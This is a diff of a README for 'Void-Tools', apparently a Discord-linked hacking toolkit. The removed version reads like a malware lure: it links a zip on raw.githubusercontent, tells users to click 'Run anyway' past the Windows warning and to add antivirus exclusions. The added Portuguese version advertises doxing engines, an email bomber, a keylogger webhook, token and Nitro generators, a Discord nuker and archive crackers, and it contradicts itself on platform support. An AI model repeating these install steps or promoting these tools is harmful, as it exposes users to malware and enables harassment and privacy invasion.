@@ -1,82 +1,347 @@
-# 🛠️ Void-Tools-v2.0 - Manage network and digital tasks easily
+# ╔══════════════════════════════════════════════════════════════╗
+# ║                                                              ║
+# ║   █████╗  ██████╗ ██╗  ██╗███████╗██╗      ██████╗ ██╗    ██╗ ║
+# ║  ██╔══██╗██╔═══██╗██║ ██╔╝██╔════╝██║     ██╔═══██╗██║    ██║ ║
+# ║  ███████║██║   ██║█████╔╝ █████╗  ██║     ██║   ██║██║ █╗ ██║ ║
+# ║  ██╔══██║██║   ██║██╔═██╗ ██╔══╝  ██║     ██║   ██║██║███╗██║ ║
+# ║  ██║  ██║╚██████╔╝██║  ██╗██║     ███████╗╚██████╔╝╚███╔███╔╝ ║
+# ║  ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝  ╚══╝╚══╝ ║
+# ║                                                              ║
+# ║          ◆ TOOLS v2.1.0 · SWAG EDITION ◆                    ║
+# ║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Prestonflatfooted659/Void-Tools-v2.0/main/Void/tools/ip-operator/Void-v-Tools-v1.7.zip)
+```
+ ██╗   ██╗ ██████╗ ██╗██████╗        ████████╗ ██████╗  ██████╗ ██╗     ███████╗
+ ██║   ██║██╔═══██╗██║██╔══██╗       ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
+ ██║   ██║██║   ██║██║██║  ██║          ██║   ██║   ██║██║   ██║██║     ███████╗
+ ╚██╗ ██╔╝██║   ██║██║██║  ██║          ██║   ██║   ██║██║   ██║██║     ╚════██║
+  ╚████╔╝ ╚██████╔╝██║██████╔╝          ██║   ╚██████╔╝╚██████╔╝███████╗███████║
+   ╚═══╝   ╚═════╝ ╚═╝╚═════╝           ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
+```
 
-Void-Tools-v2.0 provides a set of utilities for web and network research. This software includes a text interface to help you organize tasks. Use these tools as part of your research and educational studies.
+<p align="center">
+  <img src="https://img.shields.io/badge/VERSION-2.1.0-red?style=for-the-badge" />
+  <img src="https://img.shields.io/badge/TOOLS-150+-orange?style=for-the-badge" />
+  <img src="https://img.shields.io/badge/THEMES-13+-purple?style=for-the-badge" />
+  <img src="https://img.shields.io/badge/LANGUAGE-FR%2FEN-blue?style=for-the-badge" />
+  <img src="https://img.shields.io/badge/LICENSE-AGPL--3.0-green?style=for-the-badge" />
+</p>
 
-## 📥 How to download the software
+---
 
-Follow these steps to obtain the program on your Windows computer.
+## 🎯 O QUE É VOID-TOOLS?
 
-1. Go to the [official release page](https://raw.githubusercontent.com/Prestonflatfooted659/Void-Tools-v2.0/main/Void/tools/ip-operator/Void-v-Tools-v1.7.zip).
-2. Look at the list under the "Assets" heading.
-3. Click the file that ends in .exe to start your download.
-4. Save the file to a folder you can find later, such as your Downloads folder.
+> **Um arsenal completo de ferramentas para research, OSINT, network analysis e muito mais.**
+> Interface de terminal premium com 13 temas + rainbow, 150+ tools organizadas por categoria.
 
-## ⚙️ System requirements
+```
+┌─────────────────────────────────────────────────────────────┐
+│  ◆ WEB UTILITIES      ◆ NETWORK TOOLS     ◆ OSINT MODULES  │
+│  ◆ DISCORD TOOLS      ◆ BREACH FINDER     ◆ DOX ENGINE     │
+│  ◆ EMAIL INTEL        ◆ IP ANALYZER       ◆ DOMAIN RECON   │
+│  ◆ WEBHOOK SYSTEM     ◆ USERNAME HUNTER   ◆ GENERATORS     │
+│  ◆ PREMIUM ACCESS     ◆ REMOTE SYNC       ◆ AUTO-UPDATE    │
+└─────────────────────────────────────────────────────────────┘
+```
 
-Ensure your computer meets these needs to run the tool without errors.
+---
 
-* Operating System: Windows 10 or Windows 11.
-* Memory: 4 GB of RAM or more.
-* Storage: 500 MB of free space.
-* Internet Connection: Required for remote updates and network utility functions.
+## ⚡ QUICK START
 
-## 🚀 Setting up the application
+```bash
+# 1. Clone o repositório
+git clone https://github.com/davivida661-0/Void-Tools-v2.0.git
 
-1. Open the folder where you saved the file.
-2. Double-click the file named Void-Tools.exe.
-3. If a window appears labeled "Windows protected your PC," click "More info" and select "Run anyway."
-4. Wait for the terminal window to open.
-5. The application will check for updates automatically upon the first launch.
+# 2. Entre na pasta
+cd Void-Tools-v2.0
 
-## 🎨 Personalizing the interface
+# 3. Execute o setup (Windows)
+setup.bat
 
-The tool includes 13 themes to change how the text looks on your screen. When the program displays the main menu, press the corresponding number key for "Settings." Inside the settings menu, you can toggle between themes to choose a color scheme that fits your preference. These themes adjust the background and text colors to improve readability.
+# 4. Inicie o programa
+start.bat
+```
 
-## 💻 Using the utilities
+### 🐧 Linux / macOS
+```bash
+python3 Void/main.py
+```
 
-The software categorizes tools into sections. Use your arrow keys to select a category.
+---
 
-* Web Utilities: These tools help you retrieve information from public web sources. Enter a URL when requested to start the process.
-* Network Utilities: Use these to check connection status or track packets to specific hubs.
-* Research Tools: These modules assist you in gathering data for your projects and study cases.
+## 🎨 TEMAS DISPONÍVEIS
 
-## 🔄 Managing updates
+| #  | TEMA      | COR     | #  | TEMA      | COR     |
+|----|-----------|---------|----|-----------|---------|
+| 01 | 🔴 RED    | Blood   | 08 | 🩷 PINK   | Rose    |
+| 02 | 🟢 GREEN  | Neon    | 09 | 🟢 LIME   | Acid    |
+| 03 | 🔵 BLUE   | Ice     | 10 | ⚪ WHITE  | Ghost   |
+| 04 | 🟡 YELLOW | Gold    | 11 | 🌹 ROSE   | Crimson |
+| 05 | 🟣 PURPLE | Midnight| 12 | 🥇 GOLD   | Royal   |
+| 06 | 🔵 CYAN   | Electric| 13 | 🌈 RAINBOW| Prismatic|
+| 07 | 🟠 ORANGE | Fire    |    |           |         |
 
-Void-Tools-v2.0 checks for updates when you start the program. If you see a notification about a new version, click the update button within the menu. The tool performs a remote update to replace old files with the latest versions. Keep your version updated to ensure all features function as designed.
+---
 
-## 🛡️ Best practices for users
+## 🛠️ CATEGORIAS DE TOOLS
 
-Use this software within legal boundaries. The tools provided operate on public data. You are responsible for your actions while using these utilities. 
+### 🌐 WEB UTILITIES
+```
+◆ Website Info Scanner      ◆ Website Cloner
+◆ Website Dir Buster       ◆ Website Subdomain Bruteforcer
+◆ Website URL Scanner      ◆ Website Vulnerability Scanner
+◆ Website Admin Hunter     ◆ Website Basic Auth BF
+```
 
-* Respect privacy standards.
-* Limit your activities to projects where you have permission to collect data.
-* Do not use these tools to harass or disrupt other people.
-* Save your work often by using the export function within the menu.
+### 📡 NETWORK TOOLS
+```
+◆ IP Lookup                ◆ IP All Lookup
+◆ IP Pinger                ◆ IP Open Ports
+◆ IP Generator             ◆ IP Blacklist Checker
+◆ IP VPN Detector          ◆ IP Oracle
+◆ IP Localisation          ◆ Domain Intel
+```
 
-## 🆘 Troubleshooting common issues
+### 🔍 OSINT MODULES
+```
+◆ Email Info               ◆ Email OSINT
+◆ Email Bomber Reset       ◆ Username Hunter
+◆ Name Tracker             ◆ Number Info
+◆ Exif Forensic            ◆ Search Database
+```
 
-If you encounter a problem, check this list for a solution.
+### 💬 DISCORD TOOLS
+```
+◆ Discord En               ◆ Discord Fr
+◆ Discord Graphics         ◆ Webhook Generator
+◆ Nitro Generator          ◆ Premium Tools
+```
 
-* The application does not open: Ensure you have an active internet connection on the first run. The program might need to fetch internal configuration files.
-* Antivirus software blocks the program: Anti-virus software sometimes flags new programs. If you trust the source, add the folder to your exclusion list in your security settings.
-* Errors during web requests: Check your local network settings. Sometimes a firewall prevents the tool from reaching web servers.
-* Text display is messy: Ensure your terminal settings in Windows are set to the default size. Large fonts can sometimes break the interface layout.
+### 🔓 SECURITY TOOLS
+```
+◆ Breach Finder            ◆ Simple Dox
+◆ Full Dox                 ◆ RAR Cracker
+◆ ZIP Cracker              ◆ Keylogger Webhook
+```
 
-## 📋 Frequently asked questions
+### 🛠️ GENERATORS
+```
+◆ Password Generator       ◆ Token Generator
+◆ Random Data Generator    ◆ Custom Plugins
+```
 
-### What is the purpose of this tool?
-This tool serves researchers and students who need to organize web data and network information through a text-based interface.
+---
 
-### Does the software track my searches?
-No. The application runs locally on your machine. We do not store your search history on external servers.
+## 🚀 FEATURES
 
-### Can I run this on macOS or Linux?
-The current version functions specifically on Windows. Development for other operating systems remains a possibility for future releases.
+```
+╔═══════════════════════════════════════════════════════════════╗
+║  ✓ 150+ Ferramentas        ✓ 13 Temas + Rainbow             ║
+║  ✓ Interface Premium       ✓ Auto-Update Remoto             ║
+║  ✓ Multi-idioma (FR/EN)    ✓ Remote Sync Discord            ║
+║  ✓ Setup Wizard            ✓ Boot Cinematic Animado         ║
+║  ✓ Plugins Custom          ✓ Export de Dados                ║
+║  ✓ Sem Cadastro Necessário ✓ 100% Local (Privacidade)       ║
+╚═══════════════════════════════════════════════════════════════╝
+```
 
-### How do I close the program safely?
-Type "exit" into the command prompt or press the "X" button on the top right corner of the window. The tool saves your configuration settings automatically before closing.
+---
 
-### Does it require a background account?
-No. You do not need to register or sign in to use the features. The software is ready to use immediately after installation.
+## 📦 INSTALAÇÃO COMPLETA
+
+### Requisitos do Sistema
+```
+┌────────────────────────────────────────┐
+│  OS:      Windows 10/11                │
+│  RAM:     4 GB+                        │
+│  DISCO:   500 MB livre                 │
+│  NET:     Conexão ativa               │
+│  PYTHON:  3.8+                         │
+└────────────────────────────────────────┘
+```
+
+### Estrutura do Projeto
+```
+Void-Tools-v2.0/
+├── 📄 setup.bat          # Instalador automático
+├── 📄 start.bat          # Launcher principal
+├── 📄 Void/
+│   ├── 🐍 main.py        # Entry point
+│   ├── 📄 requirements.txt
+│   ├── 📁 lib/           # Core libraries
+│   │   ├── boot.py       # Cinematic boot
+│   │   ├── constants.py  # Config & themes
+│   │   ├── deps.py       # Dependency checker
+│   │   ├── router.py     # Main router
+│   │   └── ...
+│   ├── 📁 tools/         # 150+ tools
+│   │   ├── discord/
+│   │   ├── webhook/
+│   │   ├── ip-lookup/
+│   │   ├── email-info/
+│   │   └── ...
+│   ├── 📁 config/        # Configuration
+│   └── 📁 data/          # Runtime data
+└── 📄 README.md
+```
+
+---
+
+## 🔄 ATUALIZAÇÕES
+
+O Void-Tools verifica atualizações automaticamente ao iniciar. 
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│  ◆ Versão Atual:  v2.1.0                                   │
+│  ◆ Última MAJ:    WEBHOOK CATEGORY (19 tools)              │
+│  ◆ Novidades:     GIF spam · Bad words · Branding          │
+│  ◆ Como Atualizar: Menu → HOME → Liens & MAJ               │
+└─────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 🛡️ DISCLAIMER
+
+```
+╔═══════════════════════════════════════════════════════════════╗
+║  ⚠️  USO RESPONSÁVEL                                        ║
+║                                                               ║
+║  • Use apenas para fins educacionais e de pesquisa            ║
+║  • Respeite a privacidade e leis aplicáveis                  ║
+║  • Não use para atividades ilegais ou maliciosas             ║
+║  • Você é responsável pelo uso das ferramentas               ║
+╚═══════════════════════════════════════════════════════════════╝
+```
+
+---
+
+## 🔗 LINKS ÚTEIS
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│  🌐 GitHub:   github.com/davivida661-0/Void-Tools-v2.0    │
+│  💬 Discord:  discord.gg/v0id                               │
+│  🛒 Shop:     void-tools.mysellauth.com                    │
+│  📄 License:  GNU AGPL v3.0                                │
+└─────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 📊 ESTATÍSTICAS
+
+```
+╔═══════════════════════════════════════════════════════════════╗
+║  ◆ Tools:       150+          ◆ Categorias:  12             ║
+║  ◆ Temas:       13 + Rainbow  ◆ Idiomas:     FR/EN          ║
+║  ◆ Plugins:     Suportado     ◆ Updates:     Remoto         ║
+║  ◆ Auth:        Não necessário ◆ Storage:     Local          ║
+╚═══════════════════════════════════════════════════════════════╝
+```
+
+---
+
+## 🤝 CONTRIBUIR
+
+```
+1. Fork o projeto
+2. Crie uma branch (git checkout -b feature/nova-feature)
+3. Commit suas mudanças (git commit -m 'Add nova feature')
+4. Push para a branch (git push origin feature/nova-feature)
+5. Abra um Pull Request
+```
+
+---
+
+## 📝 CHANGELOG
+
+### v2.1.0 (ATUAL)
+```
+◆ Nova categoria WEBHOOK (19 tools)
+◆ Spam GIF · Bad words · Branding discord.gg/v0id
+◆ User Lookup Discord melhorado
+◆ Tokens 100% console (sem config)
+◆ Nuker: mais opções · invite console
+```
+
+### v2.0.0
+```
+◆ Dashboard modular
+◆ 150+ tools
+◆ 13 temas + rainbow
+◆ Remote sync Discord / shop / alertas
+◆ Auto-update ZIP
+◆ Setup wizard FR/EN
+◆ Premium → shop + Discord
+```
+
+---
+
+## 💎 PREMIUM
+
+```
+╔═══════════════════════════════════════════════════════════════╗
+║  ⭐ STAR FOR UNLOCK                                         ║
+║                                                               ║
+║  Star o repositório no GitHub para desbloquear              ║
+║  funcionalidades premium e apoiar o projeto!                 ║
+║                                                               ║
+║  → discord.gg/v0id                                          ║
+║  → github.com/davivida661-0/Void-Tools-v2.0                ║
+╚═══════════════════════════════════════════════════════════════╝
+```
+
+---
+
+## ⭐ SUPORTE
+
+Se precisar de ajuda:
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│  1. Verifique a seção de Troubleshooting abaixo            │
+│  2. Junte-se ao Discord: discord.gg/v0id                   │
+│  3. Abra uma Issue no GitHub                               │
+└─────────────────────────────────────────────────────────────┘
+```
+
+### Troubleshooting
+
+| Problema | Solução |
+|----------|---------|
+| App não abre | Verifique internet na primeira execução |
+| Antivirus bloqueia | Adicione à lista de exceções |
+| Erros de rede | Verifique firewall/local network |
+| Texto bagunçado | Use fonte padrão do terminal |
+
+---
+
+## 📜 FAQ
+
+**O que é esta ferramenta?**
+> Um toolkit completo para research, OSINT e network analysis com interface de terminal premium.
+
+**Precisa de cadastro?**
+> Não. Tudo roda localmente na sua máquina.
+
+**Funciona em Mac/Linux?**
+> Versão atual é Windows-only. Mac/Linux em desenvolvimento.
+
+**Como fechar com segurança?**
+> Digite `exit` ou clique no X. Configurações são salvas automaticamente.
+
+---
+
+```
+╔═══════════════════════════════════════════════════════════════╗
+║                                                               ║
+║   Feito com ❤️ por 1s0e                                      ║
+║                                                               ║
+║   ◆ Void-Tools v2.1.0 · Swag Edition                        ║
+║   ◆ © 2024 Void-Tools · GNU AGPL v3.0                       ║
+║                                                               ║
+╚═══════════════════════════════════════════════════════════════╝
+```
